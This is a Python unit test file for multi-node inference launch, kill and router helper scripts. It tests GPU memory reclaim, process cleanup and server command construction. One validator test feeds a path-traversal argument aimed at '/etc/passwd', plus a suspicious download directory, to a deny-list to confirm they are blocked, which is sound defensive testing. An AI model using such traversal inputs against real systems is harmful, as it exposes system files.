# SPDX-FileCopyrightText: 2026 Advanced Micro Devices, Inc.
# SPDX-License-Identifier: MIT

"""Unit tests for ``multi_node/scripts`` launch and kill helpers, plus the
Infera SSH fan-out helpers, the mn CLI kernel-op routing, ``_multi_node_env``
and the shell-quoting / credential hardening of the rendered entrypoints.

A tiny ``sys.modules`` ray stub lets CI import the scripts without Ray.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
import signal
import subprocess
import sys
import types
from pathlib import Path

import pytest

from hyperloom.orchestrator.actions.executors import _multi_node_env as mne


def _install_min_ray_stub() -> None:
    """Minimal ``ray`` package graph so script modules can import."""
    if "ray" in sys.modules:
        existing = sys.modules["ray"]
        if getattr(existing, "util", None) is not None:
            return
        if "ray.util" not in sys.modules:
            ray_util_fix = types.ModuleType("ray.util")
            ray_util_fix.get_node_ip_address = lambda: "127.0.0.1"
            sys.modules["ray.util"] = ray_util_fix
        existing.util = sys.modules["ray.util"]
        return

    def _remote_decorator(**_kwargs):
        def _wrap(fn):
            return fn

        return _wrap

    ray_mod = types.ModuleType("ray")
    ray_mod.init = lambda **kwargs: None
    ray_mod.nodes = lambda: []
    ray_mod.remote = _remote_decorator
    ray_mod.get = lambda ref, timeout=None: ref

    ray_util = types.ModuleType("ray.util")
    ray_util.get_node_ip_address = lambda: "127.0.0.1"

    sched = types.ModuleType("ray.util.scheduling_strategies")

    class NodeAffinitySchedulingStrategy:
        def __init__(self, node_id: str, soft: bool = False) -> None:
            self.node_id = node_id
            self.soft = soft

    sched.NodeAffinitySchedulingStrategy = NodeAffinitySchedulingStrategy

    ray_mod.util = ray_util
    sys.modules["ray"] = ray_mod
    sys.modules["ray.util"] = ray_util
    sys.modules["ray.util.scheduling_strategies"] = sched


def _repo_root() -> Path:
    return Path(__file__).resolve().parents[1]


def _load_script_module(unique_name: str, script_name: str):
    _install_min_ray_stub()
    path = _repo_root() / "multi_node" / "scripts" / script_name
    spec = importlib.util.spec_from_file_location(unique_name, path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {path}")
    mod = importlib.util.module_from_spec(spec)
    sys.modules[unique_name] = mod
    spec.loader.exec_module(mod)
    return mod


def test_resolve_kb_topology_carries_formation_and_backend(monkeypatch, tmp_path):
    """tp/ep/backend are part of the KB key, so they must survive the env hop."""
    monkeypatch.delenv("HYPERLOOM_MN_EXT_SERVICE_URL", raising=False)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(tmp_path / "state.json"))
    monkeypatch.setenv("INFERENCE_OPTIMIZER_NODES", "2")
    monkeypatch.setenv("INFERENCE_OPTIMIZER_GPUS_PER_NODE", "8")
    monkeypatch.setenv("TP", "8")
    monkeypatch.setenv("EP", "4")
    monkeypatch.setenv("INFERENCE_OPTIMIZER_MN_BACKEND", "infera")

    topo = mne.resolve_kb_topology()

    assert topo["nodes"] == 2
    assert topo["gpus_per_node"] == 8
    assert topo["tp"] == 8
    assert topo["ep"] == 4
    assert topo["backend"] == "infera"


def _kb_env(monkeypatch, tmp_path, **env):
    """Isolate resolve_kb_topology from the ambient env and any real state file."""
    monkeypatch.delenv("HYPERLOOM_MN_EXT_SERVICE_URL", raising=False)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(tmp_path / "state.json"))
    for key in ("INFERENCE_OPTIMIZER_NODES", "INFERENCE_OPTIMIZER_GPUS_PER_NODE", "TP", "EP", "PD_MODE"):
        monkeypatch.delenv(key, raising=False)
    for key, value in env.items():
        monkeypatch.setenv(key, value)


def test_resolve_kb_topology_prefers_env_over_state(monkeypatch, tmp_path):
    """Env is exported before T0 and stable across a resume, so it outranks state."""
    _kb_env(monkeypatch, tmp_path, TP="8", EP="4", INFERENCE_OPTIMIZER_NODES="2")
    monkeypatch.setattr(mne, "_read_state", lambda: {"nodes": 2, "tp": 2, "ep": 2})

    topo = mne.resolve_kb_topology()

    assert topo["tp"] == 8
    assert topo["ep"] == 4


def test_resolve_kb_topology_falls_back_to_state_on_unparsable_env(monkeypatch, tmp_path):
    """A junk TP/EP env must not shadow the persisted value it cannot replace."""
    _kb_env(monkeypatch, tmp_path, TP="not-a-number", EP="", INFERENCE_OPTIMIZER_NODES="2")
    monkeypatch.setattr(mne, "_read_state", lambda: {"nodes": 2, "tp": 4, "last_restart_ep": 8})

    topo = mne.resolve_kb_topology()

    assert topo["tp"] == 4
    assert topo["ep"] == 8


def test_resolve_kb_topology_leaves_tp_unspecified_rather_than_inventing_one(monkeypatch, tmp_path):
    """An unresolvable TP must omit the suffix, not claim the run was TP1.

    ``kb_hardware_slug`` documents ``tp <= 0`` as "unspecified"; defaulting to 1
    instead keyed such runs as a formation nobody measured.
    """
    from hyperloom.inference_optimizer.recipe_snapshot_constants import kb_hardware_slug

    _kb_env(monkeypatch, tmp_path, INFERENCE_OPTIMIZER_NODES="2", INFERENCE_OPTIMIZER_GPUS_PER_NODE="8")
    monkeypatch.setattr(mne, "_read_state", lambda: {"nodes": 2})

    topo = mne.resolve_kb_topology()

    assert topo["tp"] == 0
    assert topo["ep"] == 0
    assert "_tp" not in kb_hardware_slug("MI300X", **topo)


def test_resolve_kb_topology_backend_matches_the_handoff_routing(monkeypatch, tmp_path):
    """The KB key must name the control plane the run actually routes to.

    A hardcoded backend default let a rayjob hand-off be keyed (and routed) as
    infera whenever the platform omitted INFERENCE_OPTIMIZER_MN_BACKEND.
    """
    from hyperloom.inference_optimizer.multi_node._internal import external_state as ext

    monkeypatch.delenv("INFERENCE_OPTIMIZER_MN_BACKEND", raising=False)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(tmp_path / "state.json"))
    monkeypatch.setenv("INFERENCE_OPTIMIZER_NODES", "2")
    monkeypatch.setenv("HYPERLOOM_MN_EXT_SERVICE_URL", "http://frontend:8000")
    monkeypatch.setenv("HYPERLOOM_MN_EXT_HEAD_IP", "10.0.0.9")
    for var in ("SSH_KEY", "PREFILL_IPS", "DECODE_IPS", "WORKER_IPS"):
        monkeypatch.delenv(f"HYPERLOOM_MN_EXT_{var}", raising=False)

    assert ext.build_external_state_from_env()["backend"] == "rayjob"
    assert mne.resolve_kb_topology()["backend"] == "rayjob"


def test_denied_extra_args_matches_sandbox_speculative_draft_rules():
    # The pod-side copy must mirror server_args_safety: exempt the flag by name,
    # but still constrain its value. Divergence silently blocks the sandbox-side
    # exemption at the pod boundary.
    mod = _load_script_module("_ln_mn_specdraft", "launch_multinode.py")
    assert mod._denied_extra_args("--speculative-draft-model-path /wekafs/models/draft") == []
    assert mod._denied_extra_args("--speculative-draft-model-path=/wekafs/models/draft") == []
    for bad in ("Qwen/draft", "hf://org/draft", "/wekafs/../etc/passwd"):
        assert mod._denied_extra_args(f"--speculative-draft-model-path {bad}")
    assert mod._denied_extra_args("--speculative-draft-model-path --speculative-num-steps 3")
    assert mod._denied_extra_args("--download-dir /tmp/evil") == ["--download-dir"]


def _pd_legs_probe(lm, monkeypatch, *, healthy: set[str], log_dir: str | None = None):
    """Run _wait_pd_legs_health against a fake urlopen, with no sleeping."""

    class _Resp:
        def __init__(self, status: int) -> None:
            self.status = status

        def __enter__(self):
            return self

        def __exit__(self, *_exc):
            return False

    def _fake_urlopen(url, timeout=None):
        role = "prefill" if "10.0.1.1" in url else "decode"
        return _Resp(200 if role in healthy else 503)

    import urllib.request

    monkeypatch.setattr(urllib.request, "urlopen", _fake_urlopen)
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    return lm._wait_pd_legs_health("http://10.0.1.1:30000", "http://10.0.1.2:30001", 1, log_dir=log_dir)


def test_pd_launch_waits_for_both_legs_before_reporting_done(monkeypatch):
    """A terminal launch status has to mean the cluster served, not just spawned.

    The driver used to return the moment the PD ranks were spawned, because the
    router that owns the public port is only submitted afterwards. Its job then
    read SUCCEEDED while the weight load had tens of minutes left, so a caller
    retrying mid-boot could not tell a booting cluster from a dead one -- the
    ambiguity the whole resume decision then had to work around.
    """
    lm = _load_script_module("lm_pd_ready", "launch_multinode.py")

    assert _pd_legs_probe(lm, monkeypatch, healthy={"prefill", "decode"}) is True


def test_pd_launch_reports_undetermined_when_a_leg_never_answers(monkeypatch):
    """A slow boot must not be called a failure; the caller probes from there."""
    lm = _load_script_module("lm_pd_slow", "launch_multinode.py")

    assert _pd_legs_probe(lm, monkeypatch, healthy={"prefill"}) is None


def test_pd_launch_does_not_false_fail_a_silent_remote_leg(monkeypatch, tmp_path):
    """A decode leg that has not answered yet is not "dead" from a remote PID.

    The decode leader runs on a different node than this driver, so its PID is
    in that node's namespace; the old os.kill early-abort raised
    ProcessLookupError for a perfectly healthy remote leg and false-failed the
    launch (the systematic ``mn_server_restart_failed`` seen only in rayjob PD).
    With no fatal in the leg's log, a still-silent leg must read undetermined,
    not failed.
    """
    lm = _load_script_module("lm_pd_silent_remote", "launch_multinode.py")
    (tmp_path / "decode_0.log").write_text("loading weights...\n", encoding="utf-8")

    assert _pd_legs_probe(lm, monkeypatch, healthy={"prefill"}, log_dir=str(tmp_path)) is None


def test_pd_launch_fails_fast_on_a_fatal_in_a_leg_log(monkeypatch, tmp_path):
    """A crashed leg whose nohup wrapper lingers must abort, not wait the budget.

    In PD mode the decode leg can log a fatal traceback while its wrapper PID
    stays alive (and, being remote, is not ours to os.kill anyway). Scanning the
    leg's own log is the cross-node-safe proof of death: it lets the driver bail
    early and tells the caller it crashed rather than was killed.
    """
    lm = _load_script_module("lm_pd_fatal", "launch_multinode.py")
    (tmp_path / "decode_0.log").write_text(
        "loading weights...\nRuntimeError: HIP out of memory\n",
        encoding="utf-8",
    )

    assert _pd_legs_probe(lm, monkeypatch, healthy={"prefill"}, log_dir=str(tmp_path)) is False


def test_router_launch_replaces_a_live_router_instead_of_orphaning_it(tmp_path):
    """A second router must not be stacked on top of the one already running.

    The spawn ends with ``echo $! > router.pid``, so a router started while one
    was live left the old process holding the public port with nothing naming
    it: ``kill_multinode`` sweeps ``router*.pid``, which now points at the
    newcomer, so the orphan survives every later kill. The resume paths reach
    this without ever sweeping the pid dir, which is what made it reachable.
    """
    lr = _load_script_module("lr_test_replace", "launch_router.py")
    pid_file = tmp_path / "router.pid"

    # start_new_session mirrors the setsid the real spawn uses, so the group
    # signalled here is the router's own and not this test runner's.
    victim = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"], start_new_session=True)
    try:
        pid_file.write_text(str(victim.pid))

        lr._retire_previous_router(pid_file, grace_s=5.0)

        assert victim.poll() is not None, "the previous router must be stopped, not left holding the port"
    finally:
        if victim.poll() is None:  # pragma: no cover - only on an unexpected failure
            victim.kill()
        victim.wait()


def test_detach_router_retires_the_previous_one_before_spawning(tmp_path):
    """The replacement has to happen on the spawn path, not just be available.

    Guards the wiring rather than the helper: it is the call inside
    ``_detach_router`` that keeps a resume from stacking a second router.
    """
    lr = _load_script_module("lr_test_wiring", "launch_router.py")
    pid_file = tmp_path / "router.pid"
    log_file = tmp_path / "router.log"

    victim = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"], start_new_session=True)
    spawned = 0
    try:
        pid_file.write_text(str(victim.pid))

        spawned = lr._detach_router(["sleep", "30"], log_file, pid_file)

        assert victim.poll() is not None, "the previous router must be stopped by the spawn path"
        assert spawned != victim.pid
        assert int(pid_file.read_text().strip()) == spawned
    finally:
        for pid in (victim.pid, spawned):
            if pid:
                try:
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass
        victim.wait()


def test_router_signal_never_blankets_a_group_it_does_not_lead(monkeypatch):
    """A PID that leads no group belongs to someone else's, so signal it alone.

    The router is spawned under setsid and leads its own group, which is why
    reaching the group is right for it. A recorded PID that has since been
    reused, though, sits in an unrelated group -- possibly the caller's own, as
    this suite demonstrated by taking itself down -- and killpg there would
    signal processes this has no business touching.
    """
    lr = _load_script_module("lr_test_group", "launch_router.py")
    group_signals: list[int] = []
    pid_signals: list[int] = []

    monkeypatch.setattr(lr.os, "killpg", lambda pgid, _sig: group_signals.append(pgid))
    monkeypatch.setattr(lr.os, "kill", lambda pid, _sig: pid_signals.append(pid))

    monkeypatch.setattr(lr.os, "getpgid", lambda _pid: 4242)
    assert lr._signal_router(4242, signal.SIGTERM) is True
    assert (group_signals, pid_signals) == ([4242], [])

    group_signals.clear()
    monkeypatch.setattr(lr.os, "getpgid", lambda _pid: 999)
    assert lr._signal_router(4242, signal.SIGTERM) is True
    assert (group_signals, pid_signals) == ([], [4242])


def test_router_launch_tolerates_a_stale_pid_file(tmp_path):
    """A pid file naming nothing live is the normal first-launch case."""
    lr = _load_script_module("lr_test_stale", "launch_router.py")

    for content in ("", "0", "not-a-pid", "999999999"):
        pid_file = tmp_path / "router.pid"
        pid_file.write_text(content)
        lr._retire_previous_router(pid_file, grace_s=0.1)


def test_kill_remote_missing_pid_dir():
    km = _load_script_module("km_test_missing", "kill_multinode.py")
    out = km._kill_remote("/no/such/dir/exists", grace_sec=1)
    assert out == {
        "killed": [],
        "stale": [],
        "missing": [],
        "still_alive": [],
        "ports_busy": [],
        "gpu_busy": [],
    }


def test_kill_remote_non_digit_pid_file_removed(tmp_path):
    km = _load_script_module("km_test_nondigit", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_0.pid").write_text("not-a-number", encoding="utf-8")
    out = km._kill_remote(str(d), grace_sec=0)
    assert "rank_0.pid" in out["stale"]
    assert not (d / "rank_0.pid").exists()


def test_kill_remote_sentinel_zero_pid_removed(tmp_path):
    km = _load_script_module("km_test_zero", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_1.pid").write_text("0", encoding="utf-8")
    out = km._kill_remote(str(d), grace_sec=0)
    assert any("rank_1.pid" in s for s in out["stale"])
    assert not (d / "rank_1.pid").exists()


def test_kill_remote_dead_pid_stale(tmp_path, monkeypatch):
    km = _load_script_module("km_test_dead", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_2.pid").write_text("99999", encoding="utf-8")

    def _kill(pid, sig):
        if sig == 0:
            raise ProcessLookupError()

    monkeypatch.setattr("os.kill", _kill)
    out = km._kill_remote(str(d), grace_sec=0)
    assert any("rank_2.pid" in s for s in out["stale"])
    assert not (d / "rank_2.pid").exists()


def test_kill_remote_sigterms_then_process_exits(tmp_path, monkeypatch):
    km = _load_script_module("km_test_term", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_0.pid").write_text("4242", encoding="utf-8")

    after_term = {"done": False}

    def _kill(pid, sig):
        if sig == 0:
            if after_term["done"]:
                raise ProcessLookupError()
            return None
        assert pid == 4242

    def _getpgid(pid):
        assert pid == 4242
        return 424200

    def _killpg(pgid, sig):
        assert pgid == 424200
        assert sig in (signal.SIGTERM, signal.SIGKILL)
        if sig == signal.SIGTERM:
            after_term["done"] = True

    monkeypatch.setattr("os.kill", _kill)
    monkeypatch.setattr("os.getpgid", _getpgid)
    monkeypatch.setattr("os.killpg", _killpg)
    monkeypatch.setattr("time.sleep", lambda _s: None)
    # Neutralize the post-kill GPU-VRAM reclaim path so the test never shells
    # out to rocm-smi (primary footprint + fallback per-card both stubbed).
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: None)
    monkeypatch.setattr(km, "_gpu_used_mb_for_pgids", lambda _pgids: None)
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: None)

    out = km._kill_remote(str(d), grace_sec=0)
    assert any(x.startswith("rank_0.pid:") for x in out["killed"])
    assert not (d / "rank_0.pid").exists()


# --- GPU VRAM reclaim + zombie detection (teardown must wait for a clean GPU).


class _FakeProc:
    def __init__(self, returncode=0, stdout=""):
        self.returncode = returncode
        self.stdout = stdout


def test_gpu_vram_used_mb_parses_bytes_to_mib(monkeypatch):
    """rocm-smi byte values are converted to MiB (per-card used VRAM only)."""
    km = _load_script_module("km_gpu_parse", "kill_multinode.py")
    payload = {
        "card0": {"VRAM Total Memory (B)": "68702699520", "VRAM Total Used Memory (B)": str(1024 * 1024 * 100)},
        "card1": {"VRAM Total Used Memory (B)": str(1024 * 1024 * 250)},
        "system": {"Driver version": "6.1.4"},  # non-card dict must be ignored
    }
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, json.dumps(payload)))
    used = km._gpu_vram_used_mb()
    # Only the "used" keys are picked (not "Total Memory"); bytes -> MiB.
    assert used == [100.0, 250.0]


def test_gpu_vram_used_mb_none_when_rocm_smi_missing(monkeypatch):
    """A missing rocm-smi binary degrades to None (skip the GPU wait)."""
    km = _load_script_module("km_gpu_missing", "kill_multinode.py")

    def _boom(*a, **k):
        raise FileNotFoundError("rocm-smi")

    monkeypatch.setattr(km.subprocess, "run", _boom)
    assert km._gpu_vram_used_mb() is None


def test_gpu_vram_used_mb_none_on_bad_json_or_nonzero(monkeypatch):
    """Non-zero exit, empty stdout, or unparseable JSON all degrade to None."""
    km = _load_script_module("km_gpu_badjson", "kill_multinode.py")
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(1, "boom"))
    assert km._gpu_vram_used_mb() is None
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, "   "))
    assert km._gpu_vram_used_mb() is None
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, "{not json"))
    assert km._gpu_vram_used_mb() is None


def test_wait_gpu_free_returns_empty_when_below_threshold(monkeypatch):
    """All GPUs under the threshold -> immediately clean (empty list)."""
    km = _load_script_module("km_gpu_free", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: [10.0, 20.0])
    assert km._wait_gpu_free(threshold_mb=2048.0, timeout_s=5.0) == []


def test_wait_gpu_free_reports_busy_gpus_at_timeout(monkeypatch):
    """A GPU above the threshold that never drains is reported busy at timeout."""
    km = _load_script_module("km_gpu_busy", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: [50.0, 5000.0])
    monkeypatch.setattr(km.time, "sleep", lambda _s: None)
    busy = km._wait_gpu_free(threshold_mb=2048.0, timeout_s=0.0)
    assert busy == [5000.0]


def test_wait_gpu_free_skips_when_rocm_smi_unavailable(monkeypatch):
    """None from rocm-smi -> skip the wait entirely (empty)."""
    km = _load_script_module("km_gpu_skip", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: None)
    assert km._wait_gpu_free(threshold_mb=2048.0, timeout_s=999.0) == []


def test_pid_alive_false_for_zombie(monkeypatch, tmp_path):
    """A zombie (state 'Z') counts as gone even though signal-0 succeeds."""
    km = _load_script_module("km_zombie", "kill_multinode.py")
    monkeypatch.setattr("os.kill", lambda _pid, _sig: None)  # signal-0 "alive"
    # comm contains ')' to exercise the rfind-based state parse.
    stat = tmp_path / "stat"
    stat.write_bytes(b"4242 (sglang (rank0)) Z 1 4242 4242 0 -1 0\n")
    real_open = open

    def _fake_open(path, *a, **k):
        if str(path) == "/proc/4242/stat":
            return real_open(stat, *a, **k)
        return real_open(path, *a, **k)

    monkeypatch.setattr("builtins.open", _fake_open)
    assert km._pid_alive(4242) is False


def test_pid_alive_true_for_running(monkeypatch, tmp_path):
    """A running process (state 'R'/'S') is reported alive."""
    km = _load_script_module("km_running", "kill_multinode.py")
    monkeypatch.setattr("os.kill", lambda _pid, _sig: None)
    stat = tmp_path / "stat"
    stat.write_bytes(b"4242 (python3) S 1 4242 4242 0 -1 0\n")
    real_open = open

    def _fake_open(path, *a, **k):
        if str(path) == "/proc/4242/stat":
            return real_open(stat, *a, **k)
        return real_open(path, *a, **k)

    monkeypatch.setattr("builtins.open", _fake_open)
    assert km._pid_alive(4242) is True


def test_gpu_total_used_mb_sums_cards(monkeypatch):
    """Total used VRAM is the per-card sum; None passes through."""
    km = _load_script_module("km_gpu_total", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: [284.0, 284.0, 252265.2])
    assert km._gpu_total_used_mb() == 252833.2
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: None)
    assert km._gpu_total_used_mb() is None


def test_gpu_used_mb_for_pgids_attributes_by_process_group(monkeypatch):
    """VRAM is summed only for pids whose process group is ours (child included)."""
    km = _load_script_module("km_gpu_pgids", "kill_multinode.py")
    payload = {
        "system": {
            "PID100": "launcher, 0, 0, 0, unknown",  # our pg leader, no VRAM
            "PID101": "engine, 1, 104857600, 0, unknown",  # child in our pg -> 100 MiB
            "PID900": "other, 1, 209715200, 0, unknown",  # co-tenant, different pg
        }
    }
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, json.dumps(payload)))
    pgmap = {100: 50, 101: 50, 900: 90}  # pids 100+101 share pgid 50 (ours)
    monkeypatch.setattr("os.getpgid", lambda pid: pgmap[pid])
    assert km._gpu_used_mb_for_pgids({50}) == 100.0
    # No matching pgid -> 0.0 (attributable, just nothing of ours running yet).
    assert km._gpu_used_mb_for_pgids({999}) == 0.0
    # Empty input short-circuits.
    assert km._gpu_used_mb_for_pgids(set()) == 0.0


def test_gpu_used_mb_for_pgids_none_when_rocm_smi_unavailable(monkeypatch):
    """rocm-smi missing/bad -> None so the caller uses the fallback path."""
    km = _load_script_module("km_gpu_pgids_none", "kill_multinode.py")

    def _boom(*a, **k):
        raise FileNotFoundError("rocm-smi")

    monkeypatch.setattr(km.subprocess, "run", _boom)
    assert km._gpu_used_mb_for_pgids({1}) is None


def test_wait_gpu_reclaimed_returns_none_when_below_target(monkeypatch):
    """Total already at/below target+slack -> clean reclaim (None)."""
    km = _load_script_module("km_reclaim_ok", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: 3000.0)
    # target 2000 + slack 2048 = 4048 >= 3000 -> None.
    assert km._wait_gpu_reclaimed(2000.0, 2048.0, 5.0) is None


def test_wait_gpu_reclaimed_reports_residual_at_timeout(monkeypatch):
    """Total stuck above target+slack -> residual reported at timeout."""
    km = _load_script_module("km_reclaim_stuck", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: 260000.0)
    monkeypatch.setattr(km.time, "sleep", lambda _s: None)
    residual = km._wait_gpu_reclaimed(2000.0, 2048.0, 0.0)
    assert residual == 260000.0


def test_wait_gpu_reclaimed_none_when_rocm_smi_unavailable(monkeypatch):
    """rocm-smi unavailable -> skip the wait (None)."""
    km = _load_script_module("km_reclaim_skip", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: None)
    assert km._wait_gpu_reclaimed(2000.0, 2048.0, 999.0) is None


def _prep_killable_pid_dir(km, monkeypatch, tmp_path, pid=7777, pgid=770000):
    """Create a pid dir with one live-looking pid and stub signals so it 'dies'."""
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_0.pid").write_text(str(pid), encoding="utf-8")
    state = {"dead": False}

    def _kill(p, sig):
        if sig == 0:
            if state["dead"]:
                raise ProcessLookupError()
            return None

    def _killpg(pg, sig):
        if sig == signal.SIGTERM:
            state["dead"] = True

    monkeypatch.setattr("os.kill", _kill)
    monkeypatch.setattr("os.getpgid", lambda _p: pgid)
    monkeypatch.setattr("os.killpg", _killpg)
    monkeypatch.setattr("time.sleep", lambda _s: None)
    return d


def test_kill_remote_primary_reclaim_when_footprint_known(monkeypatch, tmp_path):
    """When our footprint is attributable, the workload-scoped reclaim wait runs."""
    km = _load_script_module("km_primary", "kill_multinode.py")
    d = _prep_killable_pid_dir(km, monkeypatch, tmp_path)
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: 260000.0)
    monkeypatch.setattr(km, "_gpu_used_mb_for_pgids", lambda _pgids: 250000.0)
    calls = {"primary": 0, "fallback": 0}

    def _reclaim(target, slack, timeout):
        calls["primary"] += 1
        assert timeout == 120.0  # primary uses gpu_free_timeout_s default
        return None

    monkeypatch.setattr(km, "_wait_gpu_reclaimed", _reclaim)
    monkeypatch.setattr(km, "_wait_gpu_free", lambda *a: calls.__setitem__("fallback", calls["fallback"] + 1) or [])
    out = km._kill_remote(str(d), grace_sec=0)
    assert calls == {"primary": 1, "fallback": 0}
    assert out["gpu_busy"] == []


def test_kill_remote_fallback_45s_when_footprint_unknown(monkeypatch, tmp_path):
    """When footprint can't be attributed, fall back to the 45s per-card wait."""
    km = _load_script_module("km_fallback", "kill_multinode.py")
    d = _prep_killable_pid_dir(km, monkeypatch, tmp_path)
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: None)  # rocm-smi unavailable
    monkeypatch.setattr(km, "_gpu_used_mb_for_pgids", lambda _pgids: None)
    seen = {}

    def _fallback(threshold, timeout):
        seen["threshold"] = threshold
        seen["timeout"] = timeout
        return []

    monkeypatch.setattr(km, "_wait_gpu_free", _fallback)
    monkeypatch.setattr(km, "_wait_gpu_reclaimed", lambda *a: pytest.fail("primary must not run"))
    km._kill_remote(str(d), grace_sec=0)
    assert seen == {"threshold": 2048.0, "timeout": 45.0}


def test_pd_decode_dist_init_port_derives_from_prefill():
    """PD-disaggregated decode rendezvous port = prefill port + 1, so an operator override shifts both in lock-step."""
    lm = _load_script_module("lm_test_pd_decode_port", "launch_multinode.py")
    assert lm._pd_decode_dist_init_port(lm._DEFAULT_DIST_INIT_PORT) == 29501
    assert lm._pd_decode_dist_init_port(29501) == 29502
    assert lm._pd_decode_dist_init_port(40000) == 40001
    # Hard-coded constant must NOT come back (regression guard).
    assert not hasattr(lm, "_PD_DECODE_DIST_INIT_PORT"), (
        "_PD_DECODE_DIST_INIT_PORT was reintroduced — decode port must "
        "derive from args.dist_init_port + 1, not a separate constant, "
        "or override of $RAYJOB_DIST_INIT_PORT silently collides."
    )


def test_build_sglang_cmd_head_has_host_port():
    lm = _load_script_module("lm_test_sglang_head", "launch_multinode.py")
    cmd = lm._build_sglang_cmd(
        model="/m",
        tp=2,
        nnodes=2,
        node_rank=0,
        dist_init_addr="10.0.0.1:5000",
        extra_args=["--x"],
    )
    assert "--host" in cmd and "--port" in cmd
    assert cmd[cmd.index("--port") + 1] == "8888"
    assert "--x" in cmd


def test_build_sglang_cmd_worker_omits_http_bind():
    lm = _load_script_module("lm_test_sglang_worker", "launch_multinode.py")
    cmd = lm._build_sglang_cmd(
        model="/m",
        tp=2,
        nnodes=2,
        node_rank=1,
        dist_init_addr="10.0.0.1:5000",
        extra_args=[],
    )
    assert "--host" not in cmd
    assert "--port" not in cmd


def test_build_vllm_cmd_includes_ray_backend():
    lm = _load_script_module("lm_test_vllm", "launch_multinode.py")
    cmd = lm._build_vllm_cmd(model="/m", tp=16, extra_args=["--enforce-eager"])
    assert cmd[0] == "vllm"
    assert "--distributed-executor-backend" in cmd
    assert cmd[cmd.index("--tensor-parallel-size") + 1] == "16"
    assert "--enforce-eager" in cmd


def _kv_transfer_config(cmd: list[str]) -> dict:
    return json.loads(cmd[cmd.index("--kv-transfer-config") + 1])


def test_build_vllm_cmd_kv_transfer_config_escapes_quotes():
    lm = _load_script_module("lm_test_vllm_kv_quote", "launch_multinode.py")
    connector = 'Nixl"Connector'
    cmd = lm._build_vllm_cmd(
        model="/m",
        tp=8,
        extra_args=[],
        pd_role="prefill",
        pd_transfer_backend=connector,
        pd_kv_rank=0,
        pd_kv_parallel_size=2,
    )
    cfg = _kv_transfer_config(cmd)
    assert cfg["kv_connector"] == connector
    assert cfg["kv_role"] == "kv_producer"
    assert cfg["kv_rank"] == 0
    assert cfg["kv_parallel_size"] == 2
    assert cfg["kv_buffer_device"] == "cuda"
    assert set(cfg) == {
        "kv_connector",
        "kv_role",
        "kv_rank",
        "kv_parallel_size",
        "kv_buffer_device",
    }


def test_build_vllm_cmd_kv_transfer_config_defaults_and_roles():
    lm = _load_script_module("lm_test_vllm_kv_roles", "launch_multinode.py")
    prefill = lm._build_vllm_cmd(model="/m", tp=8, extra_args=[], pd_role="prefill")
    decode = lm._build_vllm_cmd(model="/m", tp=8, extra_args=[], pd_role="decode")
    pcfg = _kv_transfer_config(prefill)
    dcfg = _kv_transfer_config(decode)
    assert pcfg["kv_connector"] == "NixlConnector"
    assert pcfg["kv_role"] == "kv_producer"
    assert dcfg["kv_connector"] == "NixlConnector"
    assert dcfg["kv_role"] == "kv_consumer"


def test_subprocess_env_prepends_venv_bin(monkeypatch):
    lm = _load_script_module("lm_test_env", "launch_multinode.py")
    monkeypatch.setenv("PATH", "/usr/bin:/bin")
    env = lm._subprocess_env()
    assert env["PATH"].startswith("/opt/venv/bin:")


def test_subprocess_env_idempotent_if_already_first(monkeypatch):
    lm = _load_script_module("lm_test_env2", "launch_multinode.py")
    monkeypatch.setenv("PATH", "/opt/venv/bin:/usr/bin")
    env = lm._subprocess_env()
    assert env["PATH"].startswith("/opt/venv/bin")
    assert env["PATH"].count("/opt/venv/bin") == 1


def test_detach_framework_launch_starts_sleep(tmp_path):
    lm = _load_script_module("lm_test_detach_sleep", "launch_multinode.py")
    log_f = tmp_path / "r0.log"
    pid_f = tmp_path / "r0.pid"
    env = dict(os.environ)
    env["PYTHONUNBUFFERED"] = "1"
    pid = lm._detach_framework_launch(
        ["sleep", "60"],
        log_f,
        pid_f,
        env,
        node_rank=0,
    )
    assert int(pid_f.read_text(encoding="utf-8").strip()) == pid
    os.kill(pid, 0)
    os.kill(pid, signal.SIGTERM)


def test_detach_framework_launch_raises_on_immediate_exit(tmp_path):
    lm = _load_script_module("lm_test_detach_false", "launch_multinode.py")
    log_f = tmp_path / "r0.log"
    pid_f = tmp_path / "r0.pid"
    env = dict(os.environ)
    env["PYTHONUNBUFFERED"] = "1"
    try:
        lm._detach_framework_launch(
            ["sh", "-c", "exit 42"],
            log_f,
            pid_f,
            env,
            node_rank=0,
        )
    except RuntimeError as exc:
        assert "immediately" in str(exc).lower() or "not alive" in str(exc).lower()
    else:
        raise AssertionError("expected RuntimeError")


